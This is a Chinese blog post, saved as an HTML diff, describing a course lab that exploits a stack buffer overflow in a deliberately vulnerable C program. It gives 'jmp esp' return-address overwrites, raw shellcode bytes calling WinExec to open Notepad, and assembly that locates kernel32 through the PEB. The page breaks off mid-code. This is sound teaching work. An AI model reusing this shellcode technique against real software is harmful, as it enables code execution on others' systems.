@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="梓曰">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言 最近学校的一些课程简单提到了一些栈溢出的相关危害，并提供一个实验让我们尝试利用缓冲区溢出来打开notepad.exe，并可以尝试在多个操作系统上达到通用性。 实验内容  此次实验采用VS完成，实验开始前记得关闭VS的各项安全保护机制  基础实验 此次实验我们的溢出点为以下代码： 123456void overflow()&amp;#123;	char  buf[10];	memcpy(buf, sh">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出的简单利用">
+<meta property="og:url" content="https://equinox-shame.github.io/2023/06/07/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Autumnal">
+<meta property="og:description" content="前言 最近学校的一些课程简单提到了一些栈溢出的相关危害，并提供一个实验让我们尝试利用缓冲区溢出来打开notepad.exe，并可以尝试在多个操作系统上达到通用性。 实验内容  此次实验采用VS完成，实验开始前记得关闭VS的各项安全保护机制  基础实验 此次实验我们的溢出点为以下代码： 123456void overflow()&amp;#123;	char  buf[10];	memcpy(buf, sh">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/ER3L27r4MkQyAKp.png">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/VqKIaSoH4v1ZTAx.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/z5DZJsHdYqQMtuV.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/9eCUAyzNkR3LlQE.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/pJFbcS8ZaVOuvj4.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/DKmwbp9PBd7NAyz.jpg">
+<meta property="og:image" content="https://s2.loli.net/2023/06/07/Ro7TPCuGimSbdKX.jpg">
+<meta property="article:published_time" content="2023-06-07T07:27:24.860Z">
+<meta property="article:modified_time" content="2023-06-07T07:24:55.887Z">
+<meta property="article:author" content="梓曰">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/07/ER3L27r4MkQyAKp.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>栈溢出的简单利用 - Autumnal</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"equinox-shame.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","app_key":"GQdXw2PjI9DScgw5QHVCZeYm","server_url":"https://2am6iuuw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Autumnal Equinox</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="栈溢出的简单利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-07 15:27" pubdate>
+          2023年6月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">栈溢出的简单利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言">前言</h2>
+<p>最近学校的一些课程简单提到了一些栈溢出的相关危害，并提供一个实验让我们尝试利用缓冲区溢出来打开<code>notepad.exe</code>，并可以尝试在多个操作系统上达到通用性。</p>
+<h2 id="实验内容">实验内容</h2>
+<blockquote>
+<p>此次实验采用<code>VS</code>完成，实验开始前记得关闭<code>VS</code>的各项安全保护机制</p>
+</blockquote>
+<h3 id="基础实验">基础实验</h3>
+<p>此次实验我们的溢出点为以下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overflow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span>  buf[<span class="hljs-number">10</span>];<br>	<span class="hljs-built_in">memcpy</span>(buf, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br>	<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们需要做的是编写一个<code>shellcode</code>来执行<code>WinExec</code>以及<code>ExitProcess</code></p>
+<p>我们先观察已给出的程序，我们可以看到<code>buf</code>的大小为 10，我们对<code>buf</code>拷贝数据时会默认在后面添加一个0x00，然后进行字节对齐其长度应该为12也就是 <code>0x0C</code><br>
+我们可以绘制出以下图：</p>
+<img src="https://s2.loli.net/2023/06/07/ER3L27r4MkQyAKp.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
+<p>可以看到我们的返回地址在我们的下面16字节处，我们构建一个<code>Shellcode</code>长为16的<code>0x90</code>，将其进行覆盖，随后我们找到一个<code>jmp esp</code>指令的地址，我们将返回地址设置为该指令的地址</p>
+<p><img src="https://s2.loli.net/2023/06/07/VqKIaSoH4v1ZTAx.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>此时shellcode为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">84</span>,<span class="hljs-number">0</span>xBC,<span class="hljs-number">0</span>xA<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">76</span><br></code></pre></td></tr></table></figure>
+<p>随后我们通过Kernel32.dll来获取相关调用函数的绝对地址</p>
+<p><img src="https://s2.loli.net/2023/06/07/z5DZJsHdYqQMtuV.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://s2.loli.net/2023/06/07/9eCUAyzNkR3LlQE.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>我们将其进行记录，为后续编写ShellCode做准备</p>
+<p>我们前面找到了<code>jmp esp</code>的代码，接下来其执行的地址空间就是我们<code>ShellCode</code>的后续内容，我们将字符串<code>C:\notepad.exe</code>进行压入栈中，需要注意一下小端序是逆序压入。之后我们压入<code>WinExec</code>的参数以及通过将绝对地址给<code>eax</code>，通过<code>call eax</code>对其进行执行</p>
+<p>我们构造的<code>ShellCode</code>变为如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">84</span>,<span class="hljs-number">0</span>xBC,<span class="hljs-number">0</span>xA<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">76</span>,<span class="hljs-number">0</span>x<span class="hljs-number">60</span>,<span class="hljs-number">0</span>x<span class="hljs-number">78</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">78</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">61</span>,<span class="hljs-number">0</span>x<span class="hljs-number">64</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>F,<span class="hljs-number">0</span>x<span class="hljs-number">74</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">70</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">63</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,<span class="hljs-number">0</span>x<span class="hljs-number">5</span>c,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>b,<span class="hljs-number">0</span>xc<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x<span class="hljs-number">83</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">04</span>,<span class="hljs-number">0</span>x<span class="hljs-number">50</span>,<span class="hljs-number">0</span>xb<span class="hljs-number">8</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>xe<span class="hljs-number">1</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">75</span>,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>我们执行完后因为后续程序地址空间内为<code>0x00</code>(Release下)或<code>0xCC</code>(Debug下)</p>
+<p>所以会引发执行异常，我们可以采用调用一个<code>ExitProcess(0)</code>来解决上述问题</p>
+<p>此时我们的ShellCode为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">84</span>,<span class="hljs-number">0</span>xBC,<span class="hljs-number">0</span>xA<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">76</span>,<span class="hljs-number">0</span>x<span class="hljs-number">60</span>,<span class="hljs-number">0</span>x<span class="hljs-number">78</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>, <span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">78</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">61</span>,<span class="hljs-number">0</span>x<span class="hljs-number">64</span>,<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>F,<span class="hljs-number">0</span>x<span class="hljs-number">74</span>,<span class="hljs-number">0</span>x<span class="hljs-number">65</span>,<span class="hljs-number">0</span>x<span class="hljs-number">70</span>,<span class="hljs-number">0</span>x<span class="hljs-number">68</span>,<span class="hljs-number">0</span>x<span class="hljs-number">63</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,<span class="hljs-number">0</span>x<span class="hljs-number">5</span>c,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>e,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a, <span class="hljs-number">0</span>x<span class="hljs-number">01</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>b,<span class="hljs-number">0</span>xc<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x<span class="hljs-number">83</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">04</span>,<span class="hljs-number">0</span>x<span class="hljs-number">50</span>,<span class="hljs-number">0</span>xb<span class="hljs-number">8</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>xe<span class="hljs-number">1</span>,<span class="hljs-number">0</span>xc<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">75</span>,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a,<span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<span class="hljs-number">0</span>xb<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x<span class="hljs-number">40</span>,<span class="hljs-number">0</span>x<span class="hljs-number">59</span>, <span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>x<span class="hljs-number">75</span>,<span class="hljs-number">0</span>xff,<span class="hljs-number">0</span>xd<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span>,<span class="hljs-number">0</span>x<span class="hljs-number">90</span><br></code></pre></td></tr></table></figure>
+<p>我们进行调试运行可以看到我们成功的将返回地址进行覆盖，然后执行内容为我们ShellCode中的汇编代码指令</p>
+<p><img src="https://s2.loli.net/2023/06/07/pJFbcS8ZaVOuvj4.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="https://s2.loli.net/2023/06/07/DKmwbp9PBd7NAyz.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>最后我们可以和成功的打开在根目录下的<code>notepad.exe</code>程序</p>
+<p><img src="https://s2.loli.net/2023/06/07/Ro7TPCuGimSbdKX.jpg" srcset="/img/loading.gif" lazyload alt=""></p>
+<h3 id="进阶实验">进阶实验</h3>
+<p>那么我们对于任意版本的<code>Windows</code>操作系统需要实现通用性便需要通过获取<code>Kernel32.dll</code>的基址，我们通过遍历其导出表来获取对应我们需要调用的函数地址，通过获取到的地址再进行调用即可完成对应操作</p>
+<p>代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> DWORD;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">GetApiAddr</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">char</span> WinExec_[] = <span class="hljs-string">&quot;WinExec&quot;</span>;<br><span class="hljs-keyword">char</span> ExitProcess_[] = <span class="hljs-string">&quot;ExitProcess&quot;</span>;<br>DWORD KernelAddr = <span class="hljs-number">0</span>;<br>DWORD WinExecAddr = <span class="hljs-number">0</span>;<br>DWORD ExitProcessAddr = <span class="hljs-number">0</span>;<br> <br><br><span class="hljs-keyword">char</span> shellcode[] =<br>&#123;<br>	<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<span class="hljs-number">0x90</span>,<br>	<span class="hljs-number">0xC0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x00</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">overflow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">char</span>  buf[<span class="hljs-number">10</span>];<br>	<span class="hljs-built_in">memcpy</span>((<span class="hljs-keyword">char</span> *)buf, shellcode, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(shellcode));<br>	<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Backdoor</span><span class="hljs-params">()</span> </span>&#123;<br>	__asm &#123;<br>		; 通过FS寄存器获取Kernel32基址<br>		mov eax, dword ptr fs : [<span class="hljs-number">30</span>h]	; 指向PEB结构<br>		mov eax, dword ptr[eax + <span class="hljs-number">0</span>Ch]	; 指向LDR Ptr32 _PEB_LDR_DATA<br>		mov eax, dword ptr[eax + <span class="hljs-number">0</span>Ch]	; 指向InLoadOrderModuleList _LIST_ENTRY<br>		mov eax, dword ptr[eax]			; 移动_LIST_ENTRY<br>		mov eax, dword ptr[eax]			; 指向Kernel32<br>		mov eax, dword ptr[eax + <span class="hljs-number">18</span>h]	; 指向DllBase基址<br>		mov KernelAddr, eax				; 保存基址<br>		<br>		<br>		push offset WinExec_<br>		push KernelAddr<br>		call GetApiAddr<br>		mov WinExecAddr, eax<br><br><br><br>		push offset ExitProcess_<br>		push KernelAddr<br>		call GetApiAddr<br>		mov ExitProcessAddr, eax<br><br><br>		; 目标文件  C:\\Windows\\notepad.exe<br>		push <span class="hljs-number">0x00006578</span><br>		push <span class="hljs-number">0x652e6461</span><br>		push <span class="hljs-number">0x7065746f</span><br>		push <span class="hljs-number">0x6e5c7377</span><br>		push <span class="hljs-number">0x6f646e69</span><br>		push <span class="hljs-number">0x575c3a43</span><br>		push <span class="hljs-number">1</span><br>		mov eax, esp<br>		add eax, <span class="hljs-number">4</span><br>		push eax<br><br>		call WinExecAddr<br><br>		push 